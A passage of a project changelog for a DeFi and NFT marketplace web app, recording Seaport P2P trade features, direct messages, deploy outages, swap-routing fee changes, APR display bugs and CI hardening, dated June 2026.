+- **Core** (`e38b79bf`). The maker offers NFTs plus an optional WETH sweetener — Seaport cannot pull native ETH from a maker — and the consideration routes the requested NFTs plus an optional native-ETH topup back to them. Counterparty restriction is **ownership-gated on-chain**: only the owner of the requested NFTs can fulfil, the same semantics OpenSea Deals uses, with `target_owner` as the API-enforced pin on top. Migration 007 upgrades `trade_offers` to carry the signed order (parameters, protocol, `seaport_order_hash`, `counter_of`, topups) and moves writes to service-role-only for parity with the `native_orders` hardening. `acceptTrade` runs a full pre-flight battery — chain guard, `getOrderStatus`, and a **live** maker-ownership re-check so stale offers fail fast. The `/api/orderbook` trade actions live in the same function (no cost against the Vercel function cap) and mirror the listing-create hardening: 5-minute replay window, allowlisted collections on both sides, signature verification, canonical-hash re-derivation, live ownership of both sides, a 20/hour throttle and counter-offer linkage, with `trade-fill` keeping the fail-closed `OrderFulfilled` receipt verification. **A latent bug was fixed in passing: `createNativeListing` had been signing orders as `orderType 2`, which is `FULL_RESTRICTED` in Seaport's enum — and with a zero zone such orders revert at fulfilment.** New listings sign `FULL_OPEN` (0); the existing type-2 rows were never fulfillable and expire on TTL.
+- **Trade window and inbox** (`9c5b2465`). A two-panel give/get builder fed by both wallets' NFTs across all three collections, WETH/ETH cash legs, and a floor-value balance meter with a lopsided-trade warning above 40% imbalance — **the classic trade-window scam tell.** The inbox carries status filters, accept behind a two-step confirm, decline, counter (sides swapped, linked via `counterOf`), soft cancel and hard on-chain Seaport revoke.
+- **Chat wave 1** (`cb27785e`). Live presence per collection room through Supabase Presence (ships with Realtime, no new infrastructure), a fixed six-emoji reaction set toggled through a new atomic `toggle_reaction` RPC using the same TOCTOU-safe pattern as `toggle_like`, and per-wallet mute with a reversible unmute-all. DM threads were **deliberately deferred to their own batch**, the commit's stated reason being that the supabase-proxy was a write-only surface and DM reads needed a carefully-reviewed SELECT extension.
+- **DMs** (`f5671980`, then `4b8af235`). Server-mediated, because the SIWE JWT lives in an httpOnly cookie and **the Realtime socket can therefore never authenticate** — the proxy attaches it server-side and RLS scopes every row. The SELECT path is hardened for `dm_messages` only: filter required, pinned order, 200-row cap, with strict schemas requiring the sender to match the JWT wallet, the channel key to be the sorted pair, and self-DMs rejected; migration 007 changed the channel separator from `:` to `_` because the proxy's safe-match charset excludes the colon. `4b8af235` then built the experience out: ENS names and deterministic gradient avatars, day separators, 5-minute message grouping, near-bottom-only autoscroll so history is not yanked, read receipts, optimistic bubbles with dashed pending styling and inline retry, trade cards rendering the real trade inline with Accept-from-thread, a global unread badge in the header, per-wallet Block with unblock-all, and single-pane navigation with a back button under 640px.
+- **One-click accept** (`f5671980`). `acceptTrade` detects `wallet_getCapabilities` atomic support and batches the missing `setApprovalForAll` calls and the fulfil into **one confirmation** via `wallet_sendCalls`, polling `wallet_getCallsStatus` for the receipt that carries the `OrderFulfilled` event the server's fill verifier checks. The sequential fallback is preserved, a user rejection inside the batch does not re-prompt through the fallback, and **a confirmed batch with missing receipts can never double-execute.**
+- **Trade Board** (`6c5596af`). Open trades with no designated taker: the requested side is wildcard criteria items (itemType 4, `identifierOrCriteria` 0 — any token from the collection) and the first qualifying wallet to fulfil wins, atomically. It is the same mechanism collection offers already settle with. `buildCriteriaResolvers` is pure and unit-tested; `acceptOpenTrade` checks order status, maker ownership, acceptor ownership of every selection and no duplicate picks before fulfilling via `fulfillAdvancedOrder`. Server-side the criteria root is pinned to 0 (**no merkle traits in v1**), the auth message binds "Taker: open", `trade-fill` drops the taker pin for open rows with the `OrderFulfilled` receipt check as the gate and blocks maker self-fill, and open trades can be cancelled but not declined.
+- **Web push** (`315b5855`). The existing push library was dead end to end: **no service worker file or registration had ever existed, so `navigator.serviceWorker.ready` hung forever**, and subscription writes used the anon client, which the wallet-keyed RLS correctly rejected. Added a minimal `public/push-sw.js` with no fetch interception, on-demand registration, all subscription writes routed through the supabase-proxy with the httpOnly SIWE JWT and the wallet pinned to the JWT claim, and a sender that no-ops gracefully without VAPID keys and prunes 404/410-dead subscriptions — wired into trade-create, trade-fill and trade-decline. The bell stays hidden until `VITE_VAPID_PUBLIC_KEY` is set; **generating and setting the VAPID keys remains an operator step.**
+- **Dutch trades** (`4b7859ea`). Offers that negotiate themselves, built on Seaport's own `startAmount → endAmount` linear interpolation — **zero new mechanics, just surfaced.** A maker's WETH sweetener can rise until accepted and a taker's ETH ask can decay; the builder takes end amounts, wrap and approve fund the end commitment, and both accept paths pay `max(start, end)` of the native legs since Seaport refunds unused `msg.value`. Every NFT leg is pinned to exactly 1/1, and the server validates end amounts under the same caps. Alongside it, `lib/valuation.js` estimates each selected token at floor × the modal's exact rarity multiplier — **one formula everywhere, capped at 5×** — instead of crude floor sums, so the trade window's signed "≈ ±X% for you" line and the lopsided warning ride real values. Wildcards stay floor-priced, because no rank exists for them yet.
+- **Social glue** (`0099b876`). Executed P2P trades surface in the activity feed alongside marketplace events, via a public `role=feed` query filtering accepted trades per collection by jsonb containment on either side. DM threads show a caution banner when there is **no shared trade history with the peer — the classic impersonation setup** — telling the user to verify identity, never act on pasted links or addresses, and only execute through trade cards. Plus quick replies under the peer's newest trade card, sent through the same optimistic machinery.
+
+### Added — Unfurl cards for shared NFTs, and a synthetic monitor after two silent deploy failures (2026-06-10)
+
+`bba4f9a1`, with `b3c0f8ef` fixing the workflow it shipped, the same day.
+
+- Edge middleware — **zero new serverless functions** — serves known unfurl bots on `/nakamigos/*` a meta-only OG card: collection cards carrying a live floor price through the cached alchemy proxy, per-NFT cards (name, image, floor) for `?token=` links, and a site card for the landing page. Humans and JS-rendering crawlers such as Google and Bing fall through to the SPA, and the stub is `noindex` with `s-maxage=300` **so bot traffic never hammers the data APIs.**
+- **The modal's "Copy shareable link" had been copying a route that never existed** — `/<slug>/nft/<id>`, a 404 for every collection, on the one button whose entire purpose is being pasted elsewhere. It now copies the canonical `gallery?token=` URL that both humans and unfurlers resolve. Opening the detail modal writes that param via `replaceState` and loading a URL carrying it reopens the modal, fetching the token directly when it falls outside the loaded pages, so the link round-trips.
+- A synthetic monitor ([`.github/workflows/synthetic-monitor.yml`](.github/workflows/synthetic-monitor.yml), 30-minute cron) probes the app shell, the alchemy proxy, the orderbook and the trades endpoints, and opens or comments on a **single deduplicated production-incident issue** on failure. The stated motivation is two silent deploy-pipeline failures already suffered: the Vercel function cap, and expired CLI auth that never aliased.
+- `b3c0f8ef` then fixed what GitHub's parser rejected in that workflow: the concurrency key was written `cancel-in-group` where the valid key is `cancel-in-progress`, and the unindented issue-body lines de-indented themselves out of the run block. The body now streams through `--body-file -`, **so no multiline string lives in the YAML at all.**
+
+### Internal — Ten drifted test files realigned, new suites for the paths that had none, and a sweep of stale comments (2026-06-09 → 2026-06-13)
+
+The small mechanical work of the window, collected so it is not lost between the feature entries.
+
+- **Ten test files had drifted from the code across audited refactors** (`ebb28259`, 2026-06-09): the R046 H-1 consent gate (`analytics`, `errorReporting`), the FE-HIGH-3 same-origin SwapAPI proxy (`aggregator`), tri-state holder flags (`useNFTBoost`), bootstrap APR copy (`usePoolData`), relaunch zero-address gating (`useBribes`, `useRestaking`), renamed boosted-farm reads and `MIN_STAKE` (`useLPFarming`), receipt passthrough restored additively in the shared wagmi mock (`useTransactionReceipt`), and a missing wagmi surface in `YieldCalculator`. Tests now pin shipped behaviour, with intent and comments preserved. Full suite afterwards: **56 files, 871 tests, 0 failures.** *That same pass is what surfaced the Irys wallet-drain regression in the entry below — three of its tests had been marked `it.fails` against a guard that no longer existed.*
+- **New coverage added alongside the fix it pins**, through the window: the pure Seaport order builder (7 tests) and the criteria-resolver mapper; DM grouping and channel-key tests plus `dm_messages` proxy-schema cases for sender forgery, self-DM, wrong channel key, oversize text and UPDATE locked to `read_at`; `navRouting.test.jsx` enforcing that every nav target is inside `VALID_TABS` and inside the `renderTab` cases, plus module-load smoke tests for `TradeWindow` and `TradesPanel`; the first Nakamigos unit tests (`api-offers.test.js`, which also smoke-tests the cross-bundle constants import); `fallbackHonesty.test.js`; `CartContext.test.jsx`; `portfolio.test.js`; `computeSpread` (`520d4220`); `imageSafety`, `errorReporting`, `formatting`, `aggregator` and `txHistory` cases; the wizard draft-recovery test; and a lapsed-period case for `useLPFarming`. Reported suite totals move **871 → 888 → 893 → 903 → 933 → 998** across the five days.
+- **The gate those numbers were measured against was the wrong one.** The surface commits report `tsc --noEmit` clean; `cfaff0e7`, the window's last commit, records that `tsc -b` — the npm build and deploy gate — then caught two type errors `--noEmit` had passed, one in `useAddLiquidity` and one in `AMMSection`. Both are noted in their own entries above. It is the same class as the `tsc -b` catch on 2026-06-11 that forced the staking-runway rewrite.
+- **Comment, doc and metadata drift cleared in passing**, each inside the commit that touched the surrounding code:
+  - the stale `push_subscriptions` schema doc-comment in `notifications.js`, replaced with a pointer to `supabase/migrations` (`d8fb3951`);
+  - `navConfig`'s "three sections of three" note and the stale ALL_NAV "mobile drawer fallback" comment, plus the matching test comment (`104cc35e`);
+  - the sitemap regenerated — redirect-only `/lending` dropped, `/nakamigos` added, lastmod refreshed — and two unused splash-art `<link rel=preload>` tags removed, with `apple-mobile-web-app-status-bar-style` and a `<noscript>` fallback added (`104cc35e`);
+  - a "ZEROED" comment sitting above the **live** `LP_FARMING_ADDRESS` in `constants.ts` (`ab31c282`);
+  - a tab-history comment claiming push where the code replaces, so Back steps over tab changes (`5c559ba3`);
+  - a "same-origin proxy" `PriceChart` comment, the dead `_currentPrice` parameter on `usePriceHistory` and its call sites, and a stale `useMyLoans` header comment (`ac027360`, `30f948ec`);
+  - an Admin comment promising a 30s refetch where the code is 10s (`fdf4763a`);
+  - a dead `GOVERNANCE.md` reference in the FAQ, an audit chip label whose date disagreed with the linked artifact's filename, and "Last reviewed: June 2026" stamps added to Security, Contracts and FAQ (`62943c96`).
+- `LOCK_OPTIONS` was extracted to `constants.ts` as a single source and consumed by all three files that had been carrying their own copy (`30f948ec`, `ac027360`).
+
+### Fixed — Production was down three ways at once: a fail-closed rate limiter, a deprecated tsconfig knob, and an unreachable database (2026-06-09)
+
+Three unrelated causes on one day. Two of them ended in the same place — the marketplace rendering skeletons with nothing behind them. The third is the one that would have kept either fix from reaching production at all.
+
+- **The rate limiter took the entire API layer down** (`0b929ae5`). The F1 fail-closed mode returned 503 on a missing or erroring Upstash — and **the Vercel project has no Upstash environment configured**, so every alchemy, opensea, etherscan and aggregator request returned `503 Rate limiter unavailable` and the Tradermigos marketplace rendered skeletons forever. Replaced with a bounded per-instance fixed-window fallback enforcing the same `{ limit, windowSec }` per identifier:key. This preserves F1's actual goal — **the API is never silently unthrottled** — without turning a Redis outage into a product outage, and a loud `console.error` once per instance keeps the missing configuration visible in the Vercel logs rather than hiding it behind a working fallback.
+- **Vercel production deploys had been failing for two days** (`5efe8906`). `TS5101: 'baseUrl' is deprecated`, because **Vercel's build resolves a newer TypeScript than the local 5.9.3 toolchain** — which left `tegridyfarms.vercel.app` pinned to a stale build while the repository looked healthy. Path aliases have resolved relative to the tsconfig since TS 4.1, so dropping the deprecated knob keeps identical behaviour on both 5.9 and 6.x rather than papering over the warning.
+- **Orderbook reads hung behind SDK retries** (`f5a90f08`). The Supabase project backing the native orderbook was unreachable — `TypeError: fetch failed` after roughly 7 seconds of SDK retries — and every GET 500'd, **stalling the listings UI behind client retries for 20+ seconds per page view.** Read queries now race a 2.5s deadline and return `{ orders: [], degraded: true }`, so external OpenSea listings render immediately with the native side honestly marked degraded. **Write paths stay loud**, on the stated reasoning that dropping creates, cancels or fills silently would be worse than failing them.
+
+### Fixed — The swap's minimum-received was bound to a venue that does not execute, and a wallet-drain guard had been refactored away (2026-06-09)
+
+- **`8db19574` amends R033 H-01.** Aggregator-selected quotes **execute on the on-chain fallback** (SwapFeeRouter / Uniswap), but the submitted `minOut` was bound to the aggregator-priced minimum — **a guaranteed revert whenever the spread exceeded slippage: gas spent, never a fill.** Both the displayed "Min. Received" (`useSwapQuote`) and the submitted `minOut` (`useSwap`) now derive from the on-chain route's own output with the user's slippage applied, which **preserves R033's display-equals-submit invariant while making the floor actually fillable** — the original fix pinned the wrong number to both sides. The 24-test `useSwap` suite pins the new contract, a verification-refusal test was added, and an `act()`-scope leak from FE-HIGH-6's async `addCustomToken` was cleaned up alongside it.
+- **`bfa518ca` restores the R044 H-2 size guard on Irys `quote()`.** A refactor had dropped the pre-SDK validation **while the module header still documented it as the wallet-drain defence** — so the file described a protection it no longer had. The launchpad wizard flows `quote()` → `fund()` → `uploadFolder()`, and the surviving upload-side caps only fire *after* the wallet has funded, **so an over-cap folder still sent ETH to Irys before anything rejected it.** `quote()` again rejects non-finite, zero and negative totals and anything over the 500MiB folder cap, without touching the SDK. Found by the test-modernisation pass recorded above: three tests pinned the missing guard and had been left marked `it.fails`; they are plain `it` again.
+
+### Changed — Credibility pass: undeployed surfaces left the nav, the zero-wall came off the homepage — and three days later the gating was deliberately overridden (2026-06-09)
+
+- **A third of the primary nav dead-ended in a "Contract Not Deployed" wall** (`90872796`). NFT Finance left the primary nav while all four of its contracts (lending, NFT lending, NFT AMM, launchpad V2) were relaunch-zeroed; Community left the More menu and the footer while all four governance contracts were zeroed; Gold Card left the footer while PremiumAccess was zeroed. The four "PROPOSED — NOT GUARANTEED" pool cards (USDT/USDC, ETH/WBTC, DOT/ETH, MANA/ETH) with em-dash statistics were removed from the Farm page. **Everything stays routable by URL and reappears in the nav automatically the moment its relaunch address lands in `constants.ts`** — `isDeployed` gating with [`frontend/src/lib/navConfig.ts`](frontend/src/lib/navConfig.ts) as the single source, and the navConfig tests updated to pin the contract. `bc57a192` then applied the same gating to the mobile bottom nav, which hardcodes its tab list for the icon pairing and had therefore missed `PRIMARY_NAV` entirely — **mobile users were still seeing the dead NFT Finance tab.** Caught in the 390px responsive pass.
+- **A wall of zeros on the homepage** (`598d01c6`). Pre-LP-seed it displayed "Total Volume: --", "Total Staked: \$9" and "Total Swaps: 0" — which reads as a dead protocol to exactly the DeFi-native audience the page is courting. `ProtocolStats` now renders live metrics only once they are meaningful and backfills the grid with evergreen guarantees that are true on day zero, with the live numbers displacing them automatically as volume, fees and swaps light up. Total Staked shows the token amount below \$1k USD rather than an underselling dollar figure. And the staking APR **keeps the real on-chain rate — recorded as the operator's explicit choice** — but gains an "early-TVL bootstrap rate" context line above 1,000%, so a five-digit emissions-over-tiny-TVL artefact reads as what it actually is rather than as bait.
+- **Two self-gating proofs instead of two more promises** (`da3d3c3b`). `RealYieldProof` reads cumulative ETH distributed, epochs completed and percent-claimed straight from `RevenueDistributor` with an Etherscan verify link, and **renders nothing at all until the first distribution lands** — so it ships pre-LP-seed without putting another zero on the homepage, and lights up on its own the day the flywheel turns. And a Route Savings line in the swap route panel compares the best venue against the worst quoted venue **on that same quote**, computed from the route-details data already on screen, so every quote is its own evidence that the multi-venue router did something for the user.
+- **The correction, three days later.** `b6fda8bd` (2026-06-12) added a `PROMOTE_PENDING` override to `navConfig` that force-shows the NFT Finance and Community sections again, because the owner had begun deploying those contracts and wanted the surfaces back. The `isDeployed` address logic is preserved and OR'd in, so `constants.ts` remains the source of truth and **the flip back to pure gating is one line**; the pages render the existing "Contract Not Deployed" placeholder until real addresses are wired, and the change cascades to TopNav, BottomNav and Footer because all three derive from the same two flags. The now-duplicate Governance link was dropped from the Footer's Product column. **The gating was not found to be wrong — it was deliberately overridden, and that distinction is the thing to carry when reading these two changes together.**
+
+### Security — Fulfillment calldata was not allowlisted, trait rarity was ~500x wrong, and 800 cards mounted in one DOM pass (2026-06-09)
+
+- **A tampered API response could choose the function** (`e79853a9`). The *target address* in both the buy and accept-offer paths was already pinned to canonical Seaport — but the **function signature** came from whatever OpenSea's `fulfillment_data` returned, and was encoded as given. The signature is now allowlisted before encoding, so a tampered response cannot make the client encode `cancel`, `incrementCounter` or `validate` at an address the user trusts. The allowlist is exported and pinned by unit tests.
+- **Trait percentages were computed against full supply.** Same commit: `TraitExplorer` divided sample counts by the collection's full supply, so a 40-of-20,000 load **showed every trait roughly 500x rarer than reality** — a number a buyer would act on. Percentages now use sample incidence, which is the unbiased estimate, and the UI marks them approximate with "loaded" qualifiers while the load is partial.
+- **Pre-flight before spending gas** (`b413a0fa`). The native orderbook calls Seaport's `getOrderStatus` before `fulfillOrder`, **so a stale row still marked active cannot burn a buyer's gas**, and a chain guard in `fulfillSeaportOrder` fails fast on a wrong-chain Buy rather than broadcasting a doomed transaction — which matters precisely because Seaport lives at the same address on most chains, so nothing else would have caught it. Trait offers are now derived from the already-fetched `offers/collection/{slug}/all` feed via `criteria.trait` instead of the `/traits` endpoint **that 400s on every mode value**, which both makes the panels show real data at zero extra OpenSea calls and stops trait bids double-counting in the collection-offers column. And the activity feed stopped claiming WebSocket — **it is 12-second polling** — while chat learned to distinguish "backend unreachable" from "no messages yet".
+- **787 live listings mounting at once** (`3236c4dd`). Production verification found every one of them rendering in a single DOM pass — roughly 800 cards and their images. The Floor grid now reveals in chunks of 60 behind a Show-more button, with sweep, sort, filter and selection logic left at data level on the full arrays so sweep-by-quantity and by-budget are unaffected. `e79853a9` capped the activity feed at 100 rows behind its existing Load More (the merged feed can reach 500 after a long session) and chat at the latest 200 messages with a notice, and added ±15% jitter to the 12s and 15s pollers **so loops sharing one rate-limit bucket stop burst-aligning.**
+- **Honest framing on the fee, and no dead-end buttons** (`cd6abdf3`). The "1% vs OpenSea 2.5%" pitch was stale — **the project's own constants record OpenSea at 1% since September 2025** — so the wizard fee box and the Tradermigos landing line sell the real edge instead: one flat 1% routed to the Tegridy treasury, with fills settling on-chain through Seaport. The stale comparison in the orderbook SDK header was corrected too. The same commit added credibility-gated loan-desk CTAs — an owner-only "borrow instead of selling" link in the NFT detail modal and a banner in MyCollection — following `isDeployed(TEGRIDY_NFT_LENDING_ADDRESS)`, the same rule navConfig uses: **invisible today, lighting up automatically when the relaunch lending address lands, so nothing advertises a contract that is dark.** It also brought the first Nakamigos unit tests (`api-offers.test.js`), including a runtime smoke test of the cross-bundle constants import.
+
+### Added — A self-gating real-yield strip, and a route-savings receipt that measured wei against token units (2026-06-09)
+
+`da3d3c3b` landed onto a homepage two commits had just finished clearing: `90872796`
+("Credibility pass, part 1") gated relaunch-zeroed surfaces out of the primary nav, and
+`598d01c6` (part 2) stopped `ProtocolStats` rendering what its own body calls a wall of
+zeros. Its two additive surfaces are described in the commit as "magnetism adds", not as
+part of that pass — but one of them exists only because of it. One shipped invisible, one
+shipped visible and wrong.
+
+**`RealYieldProof` reads the distributor and refuses to render a zero.** New
+`frontend/src/components/RealYieldProof.tsx` (94 lines) batches `totalDistributed`,
+`totalClaimed` and `epochCount` through one `useReadContracts` on a 60s `refetchInterval`.
+Under a subhead carrying an Etherscan link to the distributor — so a reader can redo the
+arithmetic — it renders three tiles: cumulative ETH paid to stakers (with a USD conversion
+off `PriceContext`), completed distribution epochs, and a claimed percentage computed in
+basis-point bigint math, `Number((totalClaimed * 10000n) / totalDistributed) / 100`. The
+whole gate is one line, `if (!deployed || totalDistributed === 0n) return null`, which is
+what let it ship pre-LP-seed onto a page that had just been cleared of zeros and light up
+on its own. Mounted on `HomePage` only at this commit; the Farm staking loop followed in
+`79b8886c` (2026-07-18, which added the `showWhenEmpty` opt-in) and the swap tab in
+`3ed95a6a`. **As of the last recorded read it had still never rendered on the homepage** —
+`RevenueDistributor.totalDistributed()` returned 0 on mainnet under `cast` on 2026-08-12,
+the reading pinned in the header of `frontend/src/lib/docsClaimHonesty.test.ts`.
+
+The gate keyed on the value, not on the read. `data?.[0]?.status === 'success' ? … : 0n`
+collapsed a failed call into the same `0n` the empty state uses, so an RPC outage was
+indistinguishable from *no distribution has landed yet* — this repo's most-repeated bug
+class, latent here only because both branches render nothing. Split into proven /
+unreadable / proven-empty on 2026-08-19 in `17774e53`, whose comment states the rule:
+the gate is on the read, not the value.
+
+**The route-savings receipt mixed units and advertised the difference as a saving.**
+`TradePage.tsx:98-108` took `Math.max`/`Math.min` over one array holding
+`tegridyOutputFormatted` and `uniOutputFormatted` — both already token units, as the
+block's own comment asserts ("parses the formatted outputs the route-details list already
+renders") — alongside every `allAggQuotes[].amountOut`, which
+`frontend/src/lib/aggregator.ts:48` documents as `in smallest unit (wei)`. Best-over-worst
+therefore straddled an 18-decimal boundary. The only display gate was
+`routeSavingsPct >= 0.05` with no upper bound (`TradePage.tsx:384`), and `toFixed(2)`
+falls back to exponential notation above 1e21, so the row rendered
+**`+4.6e+21% vs worst venue`** while the route-detail rows beneath it printed the
+aggregator's raw wei. Fixed four days later in `d6c651f7` (F226, F227), which also
+excluded degenerate-low venues from the denominator by median — the "worst venue" was
+frequently the protocol's own near-empty native pool, so the receipt was crediting the
+router for our own shallow liquidity (F235) — and moved the math into a unit-tested
+`frontend/src/lib/routeSavings.ts`.
+
+### Fixed — the swap stack was pointed at the wrong venue: Uniswap-priced trades executed against the thin native pool (2026-06-08)
+
+Two commits, one story, and the second only became safe once the first landed.
+
+- **Every genuine-Uniswap trade was being sent somewhere it could not fill** (`43c3ddbb`).
+  [`useSwap.ts`](frontend/src/hooks/useSwap.ts) assumed `SwapFeeRouter` was a
+  fee-taking wrapper *around* Uniswap. `DeployMVP` had wired it to the native
+  `TegridyRouter` — our own deep-POL venue — so a route the quote selected
+  **because Uniswap priced it best** went out with a Uniswap-derived `minOut` and
+  executed against the (currently thin) native pool, where it reverted. This was
+  the common case, not an edge: both the `'uniswap'`-selected route and the
+  aggregator's on-chain fallback leg. Both now call `UNISWAP_V2_ROUTER` directly —
+  the fallback across its three swap types, the `'uniswap'` route across those
+  three plus their three fee-on-transfer variants — and the `maxFeeBps = 100n`
+  argument goes with them at all six call sites: a genuine-Uniswap trade carries no
+  protocol fee, because the protocol is not hosting it. The three routing tests
+  were updated to match; the commit records 6/6 routing tests passing in isolation.
+- **The native route then took the fee, and lost its thumb on the scale**
+  (`003445e3`). Native (`'tegridy'`) trades and the aggregator's on-chain native
+  fallback now execute through `SwapFeeRouter`, so `SWAP_FEE_BPS` — 50 bps, added
+  to [`constants.ts`](frontend/src/lib/constants.ts) with a comment binding it to
+  the deployed `SwapFeeRouter.feeBps()` — is captured on native volume and routed
+  into the staker / POL / treasury split. Route selection changed shape at the same
+  time: the old comparison handed the native pool a fixed advantage,
+  `TEGRIDY_PREFERENCE_BPS = 15n`, and **the two comments at the comparison site
+  described that as a "0.5% preference" while the constant applied 15 bps** — the
+  code's account of its own rule and the rule differed by 3.3x. The user-facing
+  copy was the honest one: the route label read `(preferred +0.15%)`, and the
+  comment sitting directly above the constant said 0.15% too. The preference is
+  gone. The native route is now quoted and compared *net* of its own fee
+  (`tegridyOutputAfterFee = tegridyOutputAmount * (10000n - SWAP_FEE_BPS_BI) / 10000n`
+  in [`useSwapQuote.ts`](frontend/src/hooks/useSwapQuote.ts)) and wins only when it
+  still beats Uniswap after the haircut, so the user is never worse off than going
+  direct to market; the label now discloses the fee it carries and the shown output
+  already nets it. The linear haircut is deliberately conservative, and the new
+  comment says why: by AMM concavity the true output of swapping `in*(1-fee)`
+  exceeds `out*(1-fee)`, so the derived `minOut` errs safe. **Inert on landing:**
+  while the native pool is thin Uniswap wins every comparison and nothing changes;
+  it activates on its own once the deep POL makes the native pool the best-priced
+  venue.
+
+### Fixed — the APR ceiling came off, and the projection math started reading "28,567" as 28 (2026-06-07 → 2026-06-08)
+
+An arc of three commits in which a display decision quietly broke arithmetic
+three screens away.
+
+- `d5195483` replaced the `>9,999%` APR ceiling in
+  [`usePoolData.ts`](frontend/src/hooks/usePoolData.ts) with the real computed
+  APR, per operator request, and added Staking APR to the incentives strip so the
+  real number shows to disconnected and connected visitors alike. The commit notes
+  the bootstrap APR is very high at low TVL and falls toward roughly 520% at the
+  5M cap as stake grows.
+- `d3d26c7f` found the fallout. `usePoolData` renders an APR at or above 10000% as
+  a **comma string** (`'28,567'`), and every consumer did `parseFloat(pool.apr)` —
+  and `parseFloat('28,567') === 28`. So the staking card's "Projected Earnings",
+  the dashboard's "Earnings Projection" and `BoostScheduleTable`'s APY column all
+  rendered **roughly 1000x too low**. With the live base APR at ~28,567% this was
+  active, not latent. `usePoolData` now also exposes a numeric `aprNum`, which
+  `StakingCard` / `FarmPage` / `BoostScheduleTable` / `DashboardPage` use for
+  math; the comma string stays for display only. The same commit fixed a stale
+  `usePoolData` test still asserting the removed `>9999` cap — the frontend
+  baseline went from 67 failing to 66, net +1 passing with no regressions, and the
+  `usePoolData` suite is 15/15 green.
+- `0d445f32` (2026-06-08) then framed the number rather than hiding it. The APR
+  disclaimer moved from "Current rate, subject to change" to "Bootstrap rate —
+  falls as staking grows", and the hero Base APR on the home page gained an
+  "early-stage" tag and an explanatory tooltip, **keeping the real figure per the
+  show-real-APR decision** so a 28,567% headline reads as early-stage rather than
+  as a scam.
+
+### Internal — CI that did not gate the deploy branch, a suite red at import, a Dune starter kit, and small copy fixes (2026-06-07 → 2026-06-08)
+
+The mechanical half of the window, enumerated rather than dropped.
+
+- **The branch Vercel deploys was not gated by CI at all** (`2faed429`). Only
+  `main` triggered lint/tests/Slither/CodeQL; `mvp-launch` — the deploy branch —
+  ran none of them. Added to the `ci`, `contracts-ci`, `slither` and `codeql`
+  triggers. The same commit added
+  [`.github/workflows/gitleaks.yml`](.github/workflows/gitleaks.yml), a secret
+  scan over push/PR commit **ranges**, deliberately range-scoped so it does not
+  block on the known historical leak. It also records a red-team finding
+  overturned: "delete the branches" was a verified false positive, because the
+  Etherscan key is in git *history* (`9b59e21`, reachable from `main` and other
+  branches) rather than at a branch tip — deleting branches removes nothing, and
+  rotating the key is the fix.
+- **The aggregator-proxy suite had been failing at import, so none of it ran**
+  (`9ebb225b`). The seven per-provider catchalls `api/<provider>/[...path].js`
+  were consolidated into `api/aggregator/[provider]/[...path].js` on 2026-05-27
+  for the Vercel 12-function cap, but
+  [`aggregator-proxy.test.js`](frontend/api/__tests__/aggregator-proxy.test.js)
+  still imported the deleted paths — the whole file errored on import, which is
+  exactly the state in which a real regression goes unnoticed. Every import now
+  points at the consolidated handler with the `[provider]` path segment injected
+  the way `vercel.json`'s rewrites do. Stale test data fixed alongside: cow has
+  allowed GET since 2026-06-02 for `orders/{uid}` status polling, so the
+  disallowed-method probe uses DELETE. 60/60 pass. Found during the same
+  2026-06-07 full-surface audit that produced the ownership-handoff fixes in
+  `38aaad24`.
+- **A Dune starter kit, because Dune had never been connected** (`cad80eb3`).
+  [`docs/DUNE_QUERIES.md`](docs/DUNE_QUERIES.md), 122 lines of ready-to-paste
+  DuneSQL over `ethereum.logs` needing no decoding: fee/volume totals, ETH
+  distributed to stakers, claims, TOWELI rewards funded, and native-pair DEX
+  volume — with topic0 hashes, the relaunch addresses and embed steps. *Every
+  query in this file divided by the double literal `1e18`; that took three passes
+  on 2026-07-29 → 2026-07-30 to get right — see the "Dune wei→ETH divisor" entry.*
+- **`/trade` 404'd** (`4b5a4e9e`). The top-nav item is labelled "Trade" but the
+  route is `/swap`, so anyone typing or sharing `/trade` landed on the 404 page. A
+  `Navigate` alias was added, matching the existing redirect pattern
+  (learn → tokenomics, lending → nft-finance), and verified live.
+- **Two legibility fixes over the art** (`00a61e5f`, `0d445f32`): an additive
+  radial scrim behind the hero copy so the headline and subtext stay readable over
+  the light patches of the artwork — fading to transparent, so the art elsewhere
+  is untouched — and
+  [`FeatureNotDeployed`](frontend/src/components/ui/FeatureNotDeployed.tsx)'s
+  scrim raised 0.66 → 0.80 so "coming soon" copy stays legible over bright art
+  such as the Community skull. **A correction is recorded with the second one:**
+  much of the earlier "faint text" complaint was a framer-motion entrance
+  animation frozen in a backgrounded automation tab (`visibilityState` hidden),
+  not a real user-facing defect — the headings are pure white and animate in fine
+  when the tab has focus.
+- **A fee-copy conflation on the home page** (`00a61e5f`): the Core Loop section
+  read "0.3% on each trade", which is the LP pool fee, not the staker fee.
+  Changed to "a protocol fee on each swap" so the two are not read as the same
+  number.
+
+### Changed — The house-pool routing preference that could hand a user a worse price is deleted, and native routes execute through the fee router (2026-06-08)
+
+Commit `003445e3`, 00:20 — thirteen minutes after `43c3ddbb` (00:07) moved
+genuine-Uniswap trades off SwapFeeRouter. Those thirteen minutes are the setup:
+Uniswap-selected routes had just been pointed at `UNISWAP_V2_ROUTER`, and native
+routes still went to the bare `TEGRIDY_ROUTER_ADDRESS`
+(`0xE9F83A07b071748E795d2489651d5310fA098Db8`) — neither of which takes a protocol
+fee, since you cannot fee a trade you do not host — so **the Swap tab briefly had
+no execution path that could put a wei on the protocol fee line at all** (DCA and
+limit orders kept their own SwapFeeRouter paths throughout —
+[`useDCA.ts`](frontend/src/hooks/useDCA.ts),
+[`useLimitOrders.ts`](frontend/src/hooks/useLimitOrders.ts)). This commit points
+native volume back at the fee router, and only native volume:
+`selectedRoute === 'tegridy'`, plus the aggregator's on-chain native fallback, now
+write to `SWAP_FEE_ROUTER_ADDRESS`
+(`0x6d5791A660e79175F74C6D639584C98422d5956E`) through `SWAP_FEE_ROUTER_ABI` with
+an added `maxFeeBps` argument ([`useSwap.ts`](frontend/src/hooks/useSwap.ts)).
+
+**The comparison rule changed, so which venue a user's order reaches changed.**
+`TEGRIDY_PREFERENCE_BPS = 15n` is deleted. The old rule selected the native pool
+when `tegridyOut * 1.0015 >= uniOut` — the house pool could be up to ~0.15%
+*worse* than Uniswap and still take the order. The new rule compares
+`tegridyOut * (10000 - 50) / 10000 >= uniOut`, so the native pool must now be
+~0.50% *better*. That is a **~65 bps swing in the routing threshold**, in the
+user's favour on price and against house volume: native only wins when its deeper
+liquidity outruns the fee it charges
+([`useSwapQuote.ts`](frontend/src/hooks/useSwapQuote.ts)).
+
+The disclosure moved with it, and widened. The route label `(preferred +0.15%)`
+became `(incl. 0.5% fee)`, rendered from the constant rather than typed, and the
+old note only appeared when a Uniswap quote existed to be preferred over
